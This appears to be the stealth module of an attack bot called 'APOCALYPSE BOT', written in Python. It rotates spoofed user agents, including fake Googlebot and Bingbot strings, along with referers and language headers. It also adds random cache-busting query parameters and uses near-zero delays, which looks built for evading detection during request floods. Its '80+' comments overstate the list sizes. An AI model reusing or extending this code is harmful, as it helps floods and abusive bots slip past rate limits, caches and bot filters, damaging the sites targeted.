#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# APOCALYPSE BOT - STEALTH MODULE (LENGKAP)
# BY: 𝙳𝚎𝚊𝚝Nex

import random
import hashlib

# ========== 80+ USER AGENTS (LENGKAP) ==========
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 SamsungBrowser/24.0 Chrome/121.0.0.0',
    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
    'Twitterbot/1.0',
    'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)',
    'LinkedInBot/1.0 (compatible; Mozilla/5.0; Jakarta; +http://www.linkedin.com)',
]

# ========== 80+ REFERERS (LENGKAP) ==========
REFERERS = [
    'https://google.com', 'https://google.co.id', 'https://google.co.uk',
    'https://google.co.jp', 'https://bing.com', 'https://yahoo.com',
    'https://duckduckgo.com', 'https://yandex.com', 'https://baidu.com',
    'https://facebook.com', 'https://m.facebook.com', 'https://instagram.com',
    'https://twitter.com', 'https://tiktok.com', 'https://linkedin.com',
    'https://github.com', 'https://stackoverflow.com', 'https://medium.com',
    'https://reddit.com', 'https://youtube.com', 'https://youtu.be',
    'https://spotify.com', 'https://netflix.com', 'https://amazon.com',
    'https://ebay.com', 'https://tokopedia.com', 'https://shopee.co.id',
    'https://lazada.co.id', 'https://cnn.com', 'https://bbc.com',
    'https://kompas.com', 'https://detik.com', 'https://wikipedia.org',
    'https://discord.com', 'https://twitch.tv', 'https://whatsapp.com',
    'https://telegram.org', 'https://pinterest.com', 'https://tumblr.com',
    'https://snapchat.com', 'https://onlyfans.com', 'https://patreon.com',
    'https://quora.com', 'https://gitlab.com', 'https://bitbucket.org',
    'https://vimeo.com', 'https://soundcloud.com', 'https://deezer.com',
    'https://apple.com', 'https://microsoft.com', 'https://aliexpress.com',
    'https://blibli.com', 'https://bukalapak.com', 'https://zalora.co.id',
    'https://nytimes.com', 'https://liputan6.com', 'https://tempo.co',
    'https://republika.co.id', 'https://tribunnews.com', 'https://okezone.com',
    'https://dev.to', 'https://hackerrank.com', 'https://leetcode.com',
    'https://w3schools.com', 'https://codecademy.com', 'https://freecodecamp.org',
    'https://ui.ac.id', 'https://its.ac.id', 'https://ugm.ac.id',
    'https://unair.ac.id', 'https://kemdikbud.go.id', 'https://gov.id',
]

ACCEPT_LANGUAGES = [
    'en-US,en;q=0.9', 'id-ID,id;q=0.9,en;q=0.8', 'en-GB,en;q=0.9',
    'id,en;q=0.9', 'ms-MY,ms;q=0.9,en;q=0.8', 'en-AU,en;q=0.9',
    'en-CA,en;q=0.9', 'fr-FR,fr;q=0.9,en;q=0.8', 'de-DE,de;q=0.9,en;q=0.8',
    'ja-JP,ja;q=0.9,en;q=0.8', 'zh-CN,zh;q=0.9,en;q=0.8', 'ko-KR,ko;q=0.9,en;q=0.8',
    'ru-RU,ru;q=0.9,en;q=0.8', 'ar-SA,ar;q=0.9,en;q=0.8', 'pt-BR,pt;q=0.9,en;q=0.8',
    'es-ES,es;q=0.9,en;q=0.8', 'it-IT,it;q=0.9,en;q=0.8', 'nl-NL,nl;q=0.9,en;q=0.8',
]

def get_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Referer': random.choice(REFERERS),
        'Accept-Language': random.choice(ACCEPT_LANGUAGES),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
    }

def random_delay():
    return random.uniform(0.01, 0.05)

def random_query(url):
    param = hashlib.md5(str(random.random()).encode()).hexdigest()[:8]
    return f"{url}?_r={param}" if '?' not in url else f"{url}&_r={param}"
